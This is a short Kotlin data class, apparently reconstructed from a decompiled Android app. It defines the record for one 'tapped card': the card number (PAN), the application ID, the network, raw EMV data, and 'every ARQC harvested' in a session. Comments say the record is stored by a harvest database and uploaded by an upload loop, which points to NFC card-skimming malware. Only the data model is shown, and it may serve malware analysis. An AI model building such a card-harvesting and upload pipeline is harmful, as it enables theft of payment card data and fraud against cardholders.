// orig: xyz/happify/ckemv/CardRecord.java   (kept-name; field names pinned by Gson)
//
// One tapped card. Built by NfcTapHandler, persisted by HarvestDatabaseHelper,
// re-hydrated for upload by UploadLoop/PostTapUploader.

package xyz.happify.ckemv.model

data class CardRecord(
    val pan:      String,           // EMV tag 5A (or PAN from 57 Track-2)
    val aid:      String,           // selected Application Identifier
    val network:  String,           // "Visa" | "Mastercard" | "Unknown"
    val rawData:  String,           // JSON-encoded TLV bag from EmvKernel.getRawData()
    val txs:      List<HarvestedTx> // every ARQC harvested in this tap session
)
